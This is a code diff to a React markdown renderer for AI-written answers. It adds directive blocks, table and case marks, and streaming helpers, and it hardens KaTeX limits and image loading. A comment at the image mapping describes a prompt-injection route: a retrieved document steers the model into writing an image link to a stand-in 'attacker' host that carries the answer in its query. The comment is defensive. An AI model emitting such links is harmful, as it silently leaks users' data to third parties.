@@ -2,12 +2,13 @@
 
 import { Circle, CircleCheck } from 'lucide-react'
 import { HorizontalScroll } from '@/components/ui/horizontal-scroll'
-import { type FC, type ReactNode, createContext, memo, useContext, useMemo } from 'react'
+import { type FC, type ReactNode, createContext, memo, useContext, useMemo, useState } from 'react'
 import { useTranslations } from '@/i18n'
 import dynamic from 'next/dynamic'
 import ReactMarkdown, { type Components, type ExtraProps, type Options } from 'react-markdown'
 import type { PluggableList } from 'unified'
 import rehypeKatex from 'rehype-katex'
+import remarkDirective from 'remark-directive'
 import remarkGfm from 'remark-gfm'
 import remarkMath from 'remark-math'
 import { CodeBlock } from '@/shared/components/CodeBlock'
@@ -27,9 +28,93 @@ import { getLanguageFromClassName, headingAnchorId, isMermaidFence } from './uti
 import { isStatusTone, statusTone } from './status-marks'
 import { parseTally, rehypeTableShape } from './table-shape'
 import { isDelimiterRow } from '@/lib/text/markdown-table'
+import { normalizeDirectiveFences } from '@/lib/text/answer-directives'
+import {
+  ANSWER_BLOCK_LABEL_TAG,
+  ANSWER_BLOCK_TAG,
+  ANSWER_ENERGY_TAG,
+  ANSWER_MARKER_TAG,
+  ANSWER_PROJECT_TAG,
+  remarkAnswerDirectives,
+} from './directives'
+import {
+  BLOCK_BODY_TAG,
+  COMPARE_LABEL_TAG,
+  COMPARE_ROW_TAG,
+  COMPARE_STACK_TAG,
+  COMPARE_TITLE_TAG,
+  COMPARE_VALUE_TAG,
+  COMPARE_VARIANT_TAG,
+  FIGURE_LABEL_TAG,
+  FIGURE_LIMIT_TAG,
+  FIGURE_TAG,
+  FIGURE_VALUE_TAG,
+  FIGURES_TAG,
+  NOT_FOUND_TAG,
+  PANE_TAG,
+  STEP_DETAIL_TAG,
+  STEP_DUE_TAG,
+  STEP_HEAD_TAG,
+  SUBSUMPTION_PART_TAG,
+  SUBSUMPTION_TAG,
+  TASK_CELL,
+  rehypeDirectiveShape,
+} from './directive-shape'
+import {
+  AnswerBlock,
+  AnswerBlockBody,
+  AnswerBlockLabel,
+  AnswerBlockquote,
+  AnswerEnergy,
+  AnswerMarker,
+  CompareLabel,
+  CompareRow,
+  CompareStack,
+  CompareValue,
+  CompareVariant,
+  Figure,
+  Figures,
+  NotFound,
+  Pane,
+  StepItem,
+  StepPart,
+  Subsumption,
+  TaskCellContent,
+} from './directive-blocks'
+import { AnswerProject, CasesScope, hasCases, useCasesDecision } from './project-binding'
+import {
+  ListCase,
+  MarkChip,
+  PassedCheck,
+  RoleChip,
+  cellChipClass,
+  useOutcomeLabel,
+  StepList,
+  ValueBar,
+  dataCellClass,
+  headerCellClass,
+  tableClass,
+  tableFrameClass,
+  tableRowClass,
+  tableVariant,
+} from './answer-atoms'
+import { useRowActionRenderer } from './answer-block-context'
 
 /** Module-level so the list keeps one identity: a new array re-parses the document. */
-const REHYPE_PLUGINS: PluggableList = [[rehypeKatex, { throwOnError: false }], rehypeTableShape]
+/**
+ * KaTeX bounded: `maxSize` caps every user-given size (a `\rule{3000em}{3000em}`
+ * laid over the answer) in em, and `maxExpand` the macro expansions a hostile
+ * formula can make the main thread do. `trust` stays off, so `\href` and
+ * `\includegraphics` are refused.
+ */
+const KATEX_OPTIONS = { throwOnError: false, maxSize: 20, maxExpand: 200 }
+const REHYPE_PLUGINS: PluggableList = [[rehypeKatex, KATEX_OPTIONS], rehypeTableShape, rehypeDirectiveShape]
+/** The last block of a text still arriving: its last table row may be half-written (`directive-shape.ts`). */
+const REHYPE_PLUGINS_OPEN: PluggableList = [
+  [rehypeKatex, KATEX_OPTIONS],
+  rehypeTableShape,
+  [rehypeDirectiveShape, { openTail: true }],
+]
 
 /**
  * A ```mermaid fence, drawn instead of printed.
@@ -149,7 +234,45 @@ export function stabilizeStreamingMarkdown(raw: string): string {
     }
   }
 
-  return closeOpenBold(content)
+  return closeOpenBold(holdHalfDirective(content))
+}
+
+/**
+ * Hold back a directive the stream is still writing, so no `:::` or `:klas`
+ * flashes as text for a frame. An opened block needs nothing: an unclosed
+ * `:::check` runs to the end of the text, so its content is drawn as it
+ * arrives. What cannot yet parse is the fence line itself while it is being
+ * typed (colons alone, or a `[label` not yet closed), and an inline
+ * `:energy-class[` whose label has not closed.
+ */
+export function holdHalfDirective(content: string): string {
+  const cut = content.lastIndexOf('\n') + 1
+  const line = content.slice(cut)
+  const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
+  if (fences % 2 === 1) return content
+  // A fence line in progress: `::`, `:::`, `:::detai`, `:::details[Was es br`.
+  // Colons alone are a closer only when a block is open, and a closer is
+  // complete as typed.
+  if (/^\s*:{2,}$/.test(line)) return openContainers(content.slice(0, cut)) > 0 && /:{3}/.test(line) ? content : content.slice(0, cut)
+  if (/^\s*:{3,}[A-Za-z][\w-]*\[[^\]]*$/.test(line)) return content.slice(0, cut)
+  // An opener whose `{attributes}` are still being typed: `:::cases{by=escape_le`.
+  if (/^\s*:{3,}[A-Za-z][\w-]*(?:\[[^\]]*\])?\{[^}]*$/.test(line)) return content.slice(0, cut)
+  // An inline directive whose label is still open. Only the text after the
+  // line's last `]` can hold one, and only that tail is scanned: the pattern
+  // over the whole line restarts at every `:name[` on it, per token.
+  const from = line.lastIndexOf(']') + 1
+  const inline = /(^|[^\w:]):[A-Za-z][\w-]{0,63}\[[^\]]*$/.exec(line.slice(from))
+  return inline ? content.slice(0, cut + from + inline.index + inline[1].length) : content
+}
+
+/** How many directive blocks are open at the end of `content`. */
+function openContainers(content: string): number {
+  let open = 0
+  for (const line of content.split('\n')) {
+    if (/^\s*:{3,}[A-Za-z]/.test(line)) open += 1
+    else if (/^\s*:{3,}\s*$/.test(line) && open > 0) open -= 1
+  }
+  return open
 }
 
 /**
@@ -161,7 +284,7 @@ export function stabilizeStreamingMarkdown(raw: string): string {
  * which the renderer draws cell by cell.
  */
 function closeOpenBold(content: string): string {
-  const fences = content.match(/^\s*(```|~~~)/gm)?.length ?? 0
+  const fences = content.match(/^[ \t]*(```|~~~)/gm)?.length ?? 0
   if (fences % 2 === 1) return content
   const line = content.slice(content.lastIndexOf('\n') + 1)
   if (line.trimStart().startsWith('|')) return content
@@ -199,6 +322,14 @@ interface MarkdownRenderState {
   headingIds: ReadonlyMap<number, string>
   /** The lines of the text being rendered while it streams, else `null`. See {@link isOpenFence}. */
   streamingLines: readonly string[] | null
+  /** The whole text is still arriving (any block, not only the last). */
+  streaming: boolean
+  /**
+   * This view drew the text while it arrived. An all-clear check then stays
+   * open when the stream ends: folding the table the reader was reading would
+   * shrink the page under them. The next mount collapses it.
+   */
+  streamedHere: boolean
 }
 
 const NO_HEADINGS: ReadonlyMap<number, string> = new Map()
@@ -207,6 +338,8 @@ const MarkdownRenderStateContext = createContext<MarkdownRenderState>({
   compact: false,
   headingIds: NO_HEADINGS,
   streamingLines: null,
+  streaming: false,
+  streamedHere: false,
 })
 
 const useMarkdownRenderState = (): MarkdownRenderState => useContext(MarkdownRenderStateContext)
@@ -296,7 +429,7 @@ function MarkdownH1({ children, node }: HeadingProps) {
   return (
     <h1
       id={id}
-      className="text-foreground mb-3 mt-6 block scroll-mt-4 text-2xl font-semibold tracking-tight"
+      className="text-foreground mb-3 mt-8 block scroll-mt-4 text-xl font-semibold tracking-tight"
     >
       {children}
     </h1>
@@ -311,7 +444,7 @@ function MarkdownH2({ children, node, id: givenId, className: givenClass }: Head
   return (
     <h2
       id={givenId ?? derived}
-      className={`mb-2 mt-5 block scroll-mt-4 text-xl font-semibold tracking-tight text-foreground${givenClass ? ` ${givenClass}` : ''}`}
+      className={`mb-3 mt-8 block scroll-mt-4 text-lg font-semibold tracking-tight text-foreground${givenClass ? ` ${givenClass}` : ''}`}
     >
       {children}
     </h2>
@@ -323,7 +456,7 @@ function MarkdownH3({ children, node }: HeadingProps) {
   return (
     <h3
       id={id}
-      className="text-foreground mb-2 mt-4 block scroll-mt-4 text-base font-semibold tracking-tight"
+      className="text-foreground mb-2 mt-6 block scroll-mt-4 text-base font-semibold tracking-tight"
     >
       {children}
     </h3>
@@ -364,7 +497,7 @@ function MarkdownH6({ children, node }: HeadingProps) {
 function MarkdownParagraph({ children }: React.ComponentPropsWithoutRef<'p'>) {
   const { compact } = useMarkdownRenderState()
   return (
-    <p className={`text-foreground mb-3 block leading-relaxed ${compact ? 'text-sm' : 'text-base'}`}>
+    <p className={`text-foreground mb-4 block max-w-[72ch] leading-relaxed ${compact ? 'text-sm' : 'text-base'}`}>
       {children}
     </p>
   )
@@ -372,13 +505,41 @@ function MarkdownParagraph({ children }: React.ComponentPropsWithoutRef<'p'>) {
 
 // `id` forwarded for the footnote list items, which the `[^n]` links
 // point at; without it every footnote link scrolled nowhere.
-function MarkdownListItem({ children, id }: React.ComponentPropsWithoutRef<'li'>) {
+function MarkdownListItem({ children, id, node }: React.ComponentPropsWithoutRef<'li'> & ExtraProps) {
   const { compact } = useMarkdownRenderState()
+  const { active, muted } = useCaseMarks(node?.properties)
+  const t = useTranslations('common')
+  const decided = useCasesDecision() !== null && node?.properties?.dataCaseIndex !== undefined
+  // A step of a `:::procedure` (`directive-shape.ts`).
+  if (node?.properties?.dataPhase) return <StepItem node={node}>{children}</StepItem>
+  if (active || muted) {
+    return (
+      <ListCase id={id} active={active} muted={muted} compact={compact}>
+        {children}
+        {active && decided && <MarkChip>{t('markdown.caseApplies')}</MarkChip>}
+      </ListCase>
+    )
+  }
   return (
     <li id={id} className={`text-foreground ${compact ? 'text-sm' : 'text-base'}`}>
       {children}
     </li>
   )
+}
+
+/**
+ * Whether a row or item is the case that holds, and whether it is muted: the
+ * renderer's decision in a `by=` cases block ({@link useCasesDecision}), the
+ * marks the answer wrote everywhere else.
+ */
+function useCaseMarks(properties: Record<string, unknown> | undefined): { active: boolean; muted: boolean } {
+  const cases = useCasesDecision()
+  const index = properties?.dataCaseIndex
+  if (cases && index !== undefined) {
+    const active = Number(index) === cases.match
+    return { active, muted: cases.match >= 0 && !active }
+  }
+  return { active: Boolean(properties?.dataActive), muted: Boolean(properties?.dataMuted) }
 }
 
 // The task-list checkbox, drawn as a status mark rather than a form
@@ -475,14 +636,21 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
   const tally = parseTally(node?.properties?.dataTally)
   const stackValue = node?.properties?.dataStack
   const stack = stackValue === 'true' || stackValue === 'always' ? stackValue : undefined
-  return (
-    <div className="my-4 flex flex-col gap-2 [container:answer-table/inline-size]">
-      {tally.length > 0 && (
+  const variant = tableVariant(node?.properties?.dataVariant)
+  const outcomeLabel = useOutcomeLabel()
+  // Collapsed only once the block has arrived: a check that folds away while
+  // it streams would make the answer jump up under the reader.
+  const { streaming, streamedHere } = useMarkdownRenderState()
+  const passed =
+    node?.properties?.dataCollapsed === 'true' && !streaming && !streamedHere ? Number(node.properties.dataPassCount) : 0
+  const frame = (
+    <div className={tableFrameClass(variant)} data-variant={variant === 'plain' ? undefined : variant}>
+      {tally.length > 0 && !passed && (
         <p className="flex flex-wrap items-center gap-1.5" data-testid="status-tally">
           <span className="sr-only">{t('markdown.statusTally')}: </span>
           {tally.map(([word, count]) => (
-            <Chip key={word} size="sm" variant={statusTone(word) ?? 'muted'}>
-              <span className="font-semibold tabular-nums">{count}</span> {word}
+            <Chip key={word} size="sm" variant={outcomeTone(word) ?? 'muted'}>
+              <span className="font-semibold tabular-nums">{count}</span> {outcomeLabel(word, 'tally')}
             </Chip>
           ))}
         </p>
@@ -491,14 +659,20 @@ function MarkdownTable({ children, node }: React.ComponentPropsWithoutRef<'table
         <table
           data-stack={stack}
           data-labels={node?.properties?.dataLabels === 'above' ? 'above' : undefined}
-          className="[&>tbody>tr:nth-child(even)]:bg-muted/30 min-w-full caption-bottom tabular-nums"
+          className={tableClass(variant)}
         >
           {children}
         </table>
       </HorizontalScroll>
     </div>
   )
+  if (passed > 0) return <PassedCheck passed={passed}>{frame}</PassedCheck>
+  return hasCases(node) ? <CasesScope node={node}>{frame}</CasesScope> : frame
 }
+
+/** A tally word's tone: the renderer's own outcomes, else the status word's. */
+const outcomeTone = (word: string) =>
+  word === '@pass' ? 'success' : word === '@fail' ? 'destructive' : word === '@conflict' ? 'warning' : statusTone(word)
 
 function MarkdownCaption({ children, node }: React.ComponentPropsWithoutRef<'caption'> & ExtraProps) {
   const t = useTranslations('common')
@@ -509,27 +683,168 @@ function MarkdownCaption({ children, node }: React.ComponentPropsWithoutRef<'cap
   )
 }
 
+// A row that holds (`trifft zu`, `aktuell`, a `:applies` marker) is tinted;
+// in a `:::cases` the others are muted once one holds (`directive-shape.ts`).
+function MarkdownRow({ children, node }: React.ComponentPropsWithoutRef<'tr'> & ExtraProps) {
+  const { active, muted } = useCaseMarks(node?.properties)
+  const conflict = Boolean(node?.properties?.dataConflict)
+  return (
+    <tr
+      data-active={active ? 'true' : undefined}
+      data-conflict={conflict ? 'true' : undefined}
+      aria-current={active ? 'true' : undefined}
+      className={tableRowClass({ active, muted, conflict })}
+    >
+      {children}
+    </tr>
+  )
+}
+
+function MarkdownHeaderCell({ children, align, style, node }: React.ComponentPropsWithoutRef<'th'> & ExtraProps) {
+  const t = useTranslations('common')
+  const recommended = Boolean(node?.properties?.dataRecommended)
+  if (node?.properties?.dataTaskHead) {
+    return (
+      <th className="w-0 px-2 py-2 print:hidden">
+        <span className="sr-only">{t('markdown.actions.column')}</span>
+      </th>
+    )
+  }
+  return (
+    <th
+      data-recommended={recommended ? 'true' : undefined}
+      className={headerCellClass({
+        align: cellAlignClass(align, style) ?? (node?.properties?.dataNumeric ? 'text-right' : 'text-left'),
+        recommended,
+      })}
+    >
+      {children}
+      {recommended && <MarkChip>{t('markdown.recommended')}</MarkChip>}
+    </th>
+  )
+}
+
 function MarkdownCell({ children, align, style, node }: React.ComponentPropsWithoutRef<'td'> & ExtraProps) {
   // Marked by `rehypeTableShape`, which knows the cell's column: only a Status
   // column's word is a mark. Read off the cell's text alone, „open" in a
   // Bemerkung column became a chip.
-  const status = node?.properties?.dataStatus
+  const properties = node?.properties ?? {}
+  const t = useTranslations('common')
+  const cases = useCasesDecision()
+  const status = properties.dataStatus
   const tone = isStatusTone(status) ? status : null
-  const label = node?.properties?.dataLabel
+  const label = properties.dataLabel
+  const renderRowAction = useRowActionRenderer()
+  const bar = valueBarOf(properties)
+  const ask = typeof properties.dataAsk === 'string' ? properties.dataAsk : null
+  const outcome = typeof properties.dataOutcome === 'string' ? properties.dataOutcome : null
+  const outcomeLabel = useOutcomeLabel()
+  if (properties.dataCell === TASK_CELL) {
+    return (
+      <td className="w-0 whitespace-nowrap px-2 py-1.5 align-top print:hidden" data-cell={TASK_CELL}>
+        <TaskCellContent node={node} />
+      </td>
+    )
+  }
+  const caseIndex = properties.dataCaseIndex
+  const decided = cases !== null && caseIndex !== undefined
+  const holds = decided && Number(caseIndex) === cases.match
+  let content: ReactNode = children
+  if (decided && properties.dataCaseStatus) {
+    // The renderer's case, not the model's word: the matched row says „trifft
+    // zu", a row the model claimed and the profile refutes is overruled.
+    const claimed = Boolean(properties.dataCaseClaim)
+    content = holds ? (
+      <Chip size="sm" variant="success" data-testid="status-mark" data-tone="success" data-case="holds" className={cellChipClass}>
+        {t('markdown.caseApplies')}
+      </Chip>
+    ) : claimed ? (
+      <Chip
+        size="sm"
+        variant="muted"
+        data-testid="status-mark"
+        data-tone="muted"
+        data-case="overruled"
+        title={t('markdown.caseOverruled', { word: getTextFromChildren(children) })}
+        className={cellChipClass}
+      >
+        {t('markdown.caseNotApplies')}
+      </Chip>
+    ) : tone ? (
+      <Chip size="sm" variant="muted" data-testid="status-mark" data-tone="muted" className={cellChipClass}>
+        {children}
+      </Chip>
+    ) : (
+      children
+    )
+  } else if (tone) {
+    content = (
+      <Chip
+        size="sm"
+        variant={tone}
+        data-testid="status-mark"
+        data-tone={tone}
+        data-outcome={outcome ?? undefined}
+        title={outcome ? getTextFromChildren(children) : undefined}
+        className={cellChipClass}
+      >
+        {outcome ? outcomeLabel(outcome, 'cell') : children}
+      </Chip>
+    )
+  } else if (properties.dataRole) {
+    content = <RoleChip>{children}</RoleChip>
+  }
   return (
     <td
       data-label={typeof label === 'string' ? label : undefined}
-      className={`text-foreground px-3 py-2 text-sm ${cellAlignClass(align, style) ?? ''}`}
+      data-numeric={properties.dataNumeric ? 'true' : undefined}
+      className={dataCellClass({
+        align: cellAlignClass(align, style) ?? (properties.dataNumeric ? 'text-right' : undefined),
+        recommended: Boolean(properties.dataRecommended),
+      })}
     >
-      {tone ? (
-        <Chip size="sm" variant={tone} data-testid="status-mark" data-tone={tone}>
-          {children}
-        </Chip>
-      ) : (
-        children
+      {content}
+      {holds && properties.dataCaseLead && <MarkChip>{t('markdown.caseApplies')}</MarkChip>}
+      {bar && <ValueBar {...bar} valueText={getTextFromChildren(children)} />}
+      {ask !== null && renderRowAction && (
+        <span className="ml-1.5 inline-flex align-middle print:hidden">
+          {renderRowAction({ subject: ask, detail: String(properties.dataAskDetail ?? '') })}
+        </span>
       )}
     </td>
   )
+}
+
+/** The bar a check row's value cell carries (`directive-shape.ts`), or null. */
+function valueBarOf(properties: Record<string, unknown>) {
+  const value = Number(properties.dataBarValue)
+  const limit = Number(properties.dataBarLimit)
+  if (properties.dataBarValue === undefined || !Number.isFinite(value) || !Number.isFinite(limit)) return null
+  const bound: 'min' | 'max' = properties.dataBarBound === 'min' ? 'min' : 'max'
+  const limitText = typeof properties.dataBarLimitText === 'string' ? properties.dataBarLimitText : String(limit)
+  return { value, limit, bound, pass: properties.dataBarPass === 'true', limitText }
+}
+
+function MarkdownUnorderedList({ children, className: listClassName, node }: React.ComponentPropsWithoutRef<'ul'> & ExtraProps) {
+  if (node?.properties?.dataVariant === 'steps') return <StepList ordered={false}>{children}</StepList>
+  const list = (
+    <ul
+      className={
+        listClassName?.includes('contains-task-list')
+          ? 'text-foreground mb-3 list-none space-y-1 pl-1'
+          : 'text-foreground mb-3 list-outside list-disc space-y-1 pl-5'
+      }
+    >
+      {children}
+    </ul>
+  )
+  return hasCases(node) ? <CasesScope node={node}>{list}</CasesScope> : list
+}
+
+function MarkdownOrderedList({ children, node }: React.ComponentPropsWithoutRef<'ol'> & ExtraProps) {
+  if (node?.properties?.dataVariant === 'steps') return <StepList ordered>{children}</StepList>
+  const list = <ol className="text-foreground mb-3 list-outside list-decimal space-y-1 pl-5">{children}</ol>
+  return hasCases(node) ? <CasesScope node={node}>{list}</CasesScope> : list
 }
 
 /**
@@ -554,20 +869,8 @@ const MARKDOWN_COMPONENTS = {
   // Lists. GFM task lists arrive with `contains-task-list` /
   // `task-list-item` classes; forcing `list-disc` on them drew a bullet
   // NEXT TO each checkbox, so a checklist read as two markers per row.
-  ul: ({ children, className: listClassName }: React.ComponentPropsWithoutRef<'ul'>) => (
-    <ul
-      className={
-        listClassName?.includes('contains-task-list')
-          ? 'text-foreground mb-3 list-none space-y-1 pl-1'
-          : 'text-foreground mb-3 list-outside list-disc space-y-1 pl-5'
-      }
-    >
-      {children}
-    </ul>
-  ),
-  ol: ({ children }: React.ComponentPropsWithoutRef<'ol'>) => (
-    <ol className="text-foreground mb-3 list-outside list-decimal space-y-1 pl-5">{children}</ol>
-  ),
+  ul: MarkdownUnorderedList,
+  ol: MarkdownOrderedList,
   li: MarkdownListItem,
   input: MarkdownTaskMark,
   a: MarkdownLink,
@@ -577,11 +880,7 @@ const MARKDOWN_COMPONENTS = {
   em: ({ children }: React.ComponentPropsWithoutRef<'em'>) => (
     <em className="text-foreground italic">{children}</em>
   ),
-  blockquote: ({ children }: React.ComponentPropsWithoutRef<'blockquote'>) => (
-    <blockquote className="border-base text-subtle my-3 border-l-2 pl-4 italic leading-relaxed">
-      {children}
-    </blockquote>
-  ),
+  blockquote: AnswerBlockquote,
   hr: () => <hr className="border-base my-4" />,
   table: MarkdownTable,
   caption: MarkdownCaption,
@@ -589,35 +888,62 @@ const MARKDOWN_COMPONENTS = {
     <thead className="bg-muted/50">{children}</thead>
   ),
   tbody: ({ children }: React.ComponentPropsWithoutRef<'tbody'>) => <tbody>{children}</tbody>,
-  tr: ({ children }: React.ComponentPropsWithoutRef<'tr'>) => (
-    <tr className="border-base border-b last:border-b-0">{children}</tr>
-  ),
-  th: ({ children, align, style }: React.ComponentPropsWithoutRef<'th'> & ExtraProps) => (
-    <th
-      className={`text-foreground px-3 py-2 text-sm font-semibold ${cellAlignClass(align, style) ?? 'text-left'}`}
-    >
-      {children}
-    </th>
-  ),
+  tr: MarkdownRow,
+  th: MarkdownHeaderCell,
   td: MarkdownCell,
+  [ANSWER_BLOCK_TAG]: AnswerBlock,
+  [ANSWER_BLOCK_LABEL_TAG]: AnswerBlockLabel,
+  [BLOCK_BODY_TAG]: AnswerBlockBody,
+  [ANSWER_MARKER_TAG]: AnswerMarker,
+  [ANSWER_ENERGY_TAG]: AnswerEnergy,
+  [ANSWER_PROJECT_TAG]: AnswerProject,
+  [NOT_FOUND_TAG]: NotFound,
+  [PANE_TAG]: Pane,
+  [SUBSUMPTION_TAG]: Subsumption,
+  [SUBSUMPTION_PART_TAG]: StepPart,
+  [STEP_HEAD_TAG]: StepPart,
+  [STEP_DUE_TAG]: StepPart,
+  [STEP_DETAIL_TAG]: StepPart,
+  [FIGURES_TAG]: Figures,
+  [FIGURE_TAG]: Figure,
+  [FIGURE_VALUE_TAG]: StepPart,
+  [FIGURE_LABEL_TAG]: StepPart,
+  [FIGURE_LIMIT_TAG]: StepPart,
+  [COMPARE_STACK_TAG]: CompareStack,
+  [COMPARE_VARIANT_TAG]: CompareVariant,
+  [COMPARE_TITLE_TAG]: StepPart,
+  [COMPARE_ROW_TAG]: CompareRow,
+  [COMPARE_LABEL_TAG]: CompareLabel,
+  [COMPARE_VALUE_TAG]: CompareValue,
   // Images: bounded, softened, and lazy. Without the mapping an image
   // rendered at natural size with square corners and loaded eagerly —
   // and a broken source showed the browser's raw glyph full-bleed.
-  img: ({ src, alt }: React.ComponentPropsWithoutRef<'img'> & ExtraProps) => (
-    // Markdown images come from arbitrary hosts the Next image loader is
-    // not configured for; `next/image` would 400 on every one of them.
-    // eslint-disable-next-line @next/next/no-img-element
-    <img
-      src={src}
-      alt={alt ?? ''}
-      loading="lazy"
-      className="border-base my-3 h-auto max-w-full rounded-xl border"
-    />
-  ),
+  //
+  // Only an image this origin serves is loaded. The text is the model's, and a
+  // retrieved document can steer it into `![](https://attacker/?d=<answer>)`,
+  // which the browser would fetch on render, with no click, carrying whatever
+  // the model put in the query. Any other source is drawn as a link the
+  // reader chooses to open.
+  img: ({ src, alt }: React.ComponentPropsWithoutRef<'img'> & ExtraProps) =>
+    typeof src === 'string' && isSameOriginPath(src) ? (
+      // `next/image` needs a configured loader per host; these are the app's own paths.
+      // eslint-disable-next-line @next/next/no-img-element
+      <img src={src} alt={alt ?? ''} loading="lazy" className="border-base my-3 h-auto max-w-full rounded-xl border" />
+    ) : typeof src === 'string' && src ? (
+      <a href={src} target="_blank" rel="noopener noreferrer nofollow" className="text-brand underline underline-offset-2 hover:opacity-80">
+        {alt || src}
+      </a>
+    ) : (
+      <>{alt ?? ''}</>
+    ),
 } as Components
+
+/** A path this origin serves (`/api/files/…`), never a protocol-relative `//host`. */
+const isSameOriginPath = (src: string): boolean => /^\/(?![\/\\])/.test(src)
 
 /** The rehype list of every block after the first: the document's own, then the separator the whole document puts before a block. */
 const REHYPE_PLUGINS_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS, rehypeBlockSeparator]
+const REHYPE_PLUGINS_OPEN_AFTER_FIRST: PluggableList = [...REHYPE_PLUGINS_OPEN, rehypeBlockSeparator]
 
 type FootnoteOptions = NonNullable<Options['remarkRehypeOptions']>
 
@@ -631,6 +957,10 @@ interface MarkdownBlockViewProps {
   compact: boolean
   /** The text is streaming and this is its last block: the one fence that may still be open is in it. */
   open: boolean
+  /** The text is streaming at all. */
+  streaming: boolean
+  /** This view drew the text while it arrived. */
+  streamedHere: boolean
   remarkPlugins: PluggableList
   rehypePlugins: PluggableList
   footnoteOptions: FootnoteOptions
@@ -649,6 +979,8 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
   headingIds,
   compact,
   open,
+  streaming,
+  streamedHere,
   remarkPlugins,
   rehypePlugins,
   footnoteOptions,
@@ -662,8 +994,8 @@ const MarkdownBlockView = memo(function MarkdownBlockView({
   // fence still being written; trailing blank lines do not end a block.
   const streamingLines = useMemo(() => (open ? source.trimEnd().split('\n') : null), [open, source])
   const renderState = useMemo(
-    (): MarkdownRenderState => ({ compact, headingIds: ids, streamingLines }),
-    [compact, ids, streamingLines]
+    (): MarkdownRenderState => ({ compact, headingIds: ids, streamingLines, streaming, streamedHere }),
+    [compact, ids, streamingLines, streaming, streamedHere]
   )
   return (
     <MarkdownRenderStateContext.Provider value={renderState}>
@@ -719,6 +1051,9 @@ function headingIdsByBlock(content: string, blocks: readonly MarkdownBlock[]): s
 export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
   ({ content, className = '', compact = false, isStreaming = false, remarkPlugins }) => {
     const t = useTranslations('common')
+    // Set during render, the documented way to derive state from a prop's history.
+    const [streamedHere, setStreamedHere] = useState(isStreaming)
+    if (isStreaming && !streamedHere) setStreamedHere(true)
     const footnoteOptions = useMemo(
       (): FootnoteOptions => ({
         footnoteLabel: t('markdown.footnotes'),
@@ -731,14 +1066,16 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
     // Every block but the last runs `remarkBlockContinues` first, so a plugin
     // that acts on the document's end knows the tree it sees is not the end.
     const plugins = useMemo(() => {
-      const last: PluggableList = [remarkGfm, remarkMath, ...(remarkPlugins ?? [])]
+      // The dialect before the surface's own plugins, so a `[N]` inside a
+      // block, or in text a directive put back, is still a citation.
+      const last: PluggableList = [remarkGfm, remarkMath, remarkDirective, remarkAnswerDirectives, ...(remarkPlugins ?? [])]
       return { last, notLast: [remarkBlockContinues, ...last] }
     }, [remarkPlugins])
     // While streaming, run partial content through the stabilizer so a
     // half-formed table doesn't thrash the layout token-by-token. Finalized
     // content is rendered verbatim.
     const renderedContent = useMemo(
-      () => (isStreaming ? stabilizeStreamingMarkdown(content) : content),
+      () => normalizeDirectiveFences(isStreaming ? stabilizeStreamingMarkdown(content) : content),
       [isStreaming, content]
     )
     // A text that cannot be split safely is one block: the whole document,
@@ -764,8 +1101,18 @@ export const MarkdownRenderer: FC<MarkdownRendererProps> = memo(
               headingIds={headingIds[index] ?? ''}
               compact={compact}
               open={isStreaming && last}
+              streaming={isStreaming}
+              streamedHere={streamedHere}
               remarkPlugins={last ? plugins.last : plugins.notLast}
-              rehypePlugins={index === 0 ? REHYPE_PLUGINS : REHYPE_PLUGINS_AFTER_FIRST}
+              rehypePlugins={
+                isStreaming && last
+                  ? index === 0
+                    ? REHYPE_PLUGINS_OPEN
+                    : REHYPE_PLUGINS_OPEN_AFTER_FIRST
+                  : index === 0
+                    ? REHYPE_PLUGINS
+                    : REHYPE_PLUGINS_AFTER_FIRST
+              }
               footnoteOptions={footnoteOptions}
             />
           )
